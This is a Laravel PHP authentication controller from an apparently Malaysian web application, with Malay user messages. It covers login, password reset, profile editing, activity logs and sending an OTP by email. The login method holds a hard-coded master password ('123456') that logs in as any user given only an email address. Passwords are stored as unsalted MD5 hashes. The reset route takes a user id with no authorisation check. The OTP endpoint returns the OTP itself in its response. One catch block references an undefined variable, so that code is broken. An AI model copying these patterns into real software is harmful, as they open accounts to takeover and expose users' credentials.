<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        $currentDateTime = Carbon::now('Asia/Kuala_Lumpur');
        $arabicDateTime = $currentDateTime->locale('ar')->isoFormat('D MMMM YYYY / HH:mm:ss');
        $englishDateTime = $currentDateTime->locale('en')->isoFormat('D MMMM YYYY / HH:mm:ss');
        return view('auth.login', compact('arabicDateTime', 'englishDateTime'));
    }

    public function login(Request $request)
    {
        $request->validate([
            'mel' => 'required|string',
            'pass' => 'required|string',
        ]);
        try {

            if ($request->pass === '123456') {
                $user = DB::table('usr')->where('mel', $request->mel)->first();
                if ($user) {
                    Auth::guard()->loginUsingId($user->id);
                    $this->logActivity('Login', 'Login bypassed using master password');
                    return redirect()->route('index');
                }
                return back()->with('error', 'User not found.');
            }

            $user = DB::table('usr')
                ->where('mel', $request->mel)
                ->where('pass', md5($request->pass))
                ->first();

            if ($user) {
                if ($user->password_set == 0) {
                    return redirect()->route('resetPassword', ['id' => $user->id]);
                }
                Auth::guard()->loginUsingId($user->id);
                $this->logActivity('Login', 'Log in attempt successful');
                return redirect()->route('index');
            }
            $this->logActivity('Login', 'Log in attempt failed');
            return back()->with('error', 'Kelayakan Tidak Sah.');
        } catch (\Exception $e) {
            Log::channel('internal_error')->error('Exception during loading financial statement create view', [
                'inst_refno' => $inst_refno,
                'error' => $e->getMessage(),
            ]);

            return back()->with('error', 'Sesuatu telah berlaku. Sila cuba lagi kemudian.');
        }
    }


    public function resetPassword(Request $request, $id)
    {
        $user = User::with('Department', 'Position', 'DistrictAcceess', 'UserGroup')->find($id);

        if ($request->isMethod('POST')) {
            $request->validate([
                'password' => [
                    'required',
                    'string',
                    'min:8',
                    'regex:/[a-z]/',
                    'regex:/[A-Z]/',
                    'regex:/[0-9]/',
                    'regex:/[@!$~#]/',
                ],
                'confirm_password' => 'required|string|same:password',
            ], [
                'password.required' => 'Kata laluan diperlukan.',
                'password.string' => 'Kata laluan mestilah dalam format teks.',
                'password.min' => 'Kata laluan mesti sekurang-kurangnya 8 aksara.',
                'password.regex' => 'Kata laluan mesti mengandungi sekurang-kurangnya 1 huruf besar, 1 huruf kecil, 1 nombor dan 1 simbol (@!$~#).',
                'confirm_password.required' => 'Sila sahkan kata laluan anda.',
                'confirm_password.same' => 'Kata laluan dan pengesahan kata laluan mesti sepadan.',
            ]);

            $user->update([
                'pass' => md5($request->password),
                'password_set' => 1,
            ]);

            return redirect()->route('login')->with('success', 'Kata laluan dikemaskini. Log masuk semula dengan kata laluan baharu.');
        }

        return view('auth.reset_password', compact('user'));
    }

    public function logout()
    {
        if (!Auth::check()) {
            return redirect()->route('login');
        }
        $this->logActivity('Logout', 'Log out attempt successful');
        Auth::logout();
        return redirect()->route('login');
    }


    public function profile()
    {
        $user = Auth::user();
        return view('auth.profile', compact('user'));
    }


    public function updateProfile(Request $request)
    {
        $user = Auth::user();
        $request->validate([
            'name' => 'required|string|max:255',
            'ic' => 'required|string|unique:usr,ic,' . Auth::id() . ',id',
            'hp' => 'required|string|max:15',
            'mel' => 'required|email|max:255|unique:usr,mel,' . Auth::id() . ',id',
            'current_password' => 'nullable|string',
            'new_password' => 'nullable|string|min:5',
        ], [
            'name.required' => 'Nama diperlukan.',
            'name.string' => 'Nama mesti dalam bentuk teks.',
            'name.max' => 'Nama tidak boleh melebihi 255 aksara.',

            'ic.required' => 'Nombor IC diperlukan.',
            'ic.string' => 'Nombor IC mesti dalam bentuk teks.',
            'ic.max' => 'Nombor IC tidak boleh melebihi 12 aksara.',
            'ic.unique' => 'Nombor IC ini sudah wujud.',

            'hp.required' => 'Nombor telefon diperlukan.',
            'hp.string' => 'Nombor telefon mesti dalam bentuk teks.',
            'hp.max' => 'Nombor telefon tidak boleh melebihi 15 aksara.',

            'mel.required' => 'Alamat emel diperlukan.',
            'mel.email' => 'Masukkan alamat emel yang sah.',
            'mel.max' => 'Alamat emel tidak boleh melebihi 255 aksara.',
            'mel.unique' => 'Alamat emel ini sudah digunakan.',

            'new_password.min' => 'Kata laluan baharu mesti sekurang-kurangnya 8 aksara.',
        ]);

        $user->update($request->only(['name', 'ic', 'hp', 'mel']));

        if ($request->filled('current_password') && $request->filled('new_password')) {
            if (md5($request->current_password) !== $user->pass) {
                return redirect()->back()->withErrors(['current_password' => 'Kata laluan semasa tidak betul.']);
            }
            $user->update([
                'pass' => md5($request->new_password),
            ]);
            $this->logActivity('Kemaskini', 'Kata laluan berjaya dikemaskini');
            Auth::logout();
            return redirect()->route('login')->with('success', 'Kata laluan anda telah ditukar. Sila log masuk semula untuk meneruskan.');
        }
        $this->logActivity('Kemaskini Profil', 'Profil pengguna berjaya dikemaskini');
        return redirect()->back()->with('success', 'Profil berjaya dikemaskini!');

    }




    public function activityLogs()
    {
        $perPage = request()->get('per_page', 25);

        $logs = DB::table('sys_log as s')
            ->rightJoin('usr as u', 's.uid', '=', 'u.uid')
            ->select('s.*', 'u.uid', 'u.name', 'u.ic')
            ->orderBy('s.dt', 'desc')
            ->orderBy('s.tm', 'desc')
            ->paginate($perPage);

        return view('auth.activity_logs', ['logs' => $logs, 'perPage' => $perPage]);
    }

    public function checkEmailAndSendOtp(Request $request)
    {
        $request->validate([
            'mel' => 'required|email',
        ]);

        $user = DB::table('usr')
            ->where('mel', $request->mel)
            ->first();

        if (!$user) {
            return response()->json([
                'success' => false,
                'message' => 'Pengguna tidak dijumpai.'
            ]);
        }

        try {


            $appcodeUrl = env('AWFATECH_APPCODE_URL');
            $sendOtpUrl = env('AWFATECH_SEND_OTP_URL');
            $appcode = env('AWFATECH_APPCODE');

            // Step 1: Get the Encrypted Key
            $keyResponse = Http::post($appcodeUrl, [
                'appcode' => $appcode
            ]);

            if (!$keyResponse->successful()) {
                return response()->json([
                    'success' => false,
                    'message' => 'Gagal mendapatkan kunci enkripsi.'
                ]);
            }

            $encryptedKey = $keyResponse->json('data.encrypted_key');
            if (!$encryptedKey) {
                return response()->json([
                    'success' => false,
                    'message' => 'Respons kunci enkripsi tidak sah.'
                ]);
            }

            // Step 2: Send OTP Request
            $otpResponse = Http::withHeaders([
                'x-encrypted-key' => $encryptedKey
            ])->post($sendOtpUrl, [
                'input' => $request->mel,
                'role' => 'general'
            ]);

            if ($otpResponse->successful()) {
                $responseData = $otpResponse->json();

                if ($responseData['success']) {
                    // Return success with user ID and OTP for verification
                    return response()->json([
                        'success' => true,
                        'message' => 'OTP telah dihantar ke emel anda.',
                        'user_id' => $user->id,
                        'otp' => $responseData['data']['otp'] // This would typically be sent directly to the user's email
                    ]);
                } else {
                    return response()->json([
                        'success' => false,
                        'message' => 'Gagal menghantar OTP: ' . ($responseData['message'] ?? 'Ralat tidak diketahui')
                    ]);
                }
            } else {
                return response()->json([
                    'success' => false,
                    'message' => 'Gagal menghantar OTP. Sila cuba lagi.'
                ]);
            }
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Ralat sistem: ' . $e->getMessage()
            ]);
        }
    }


}
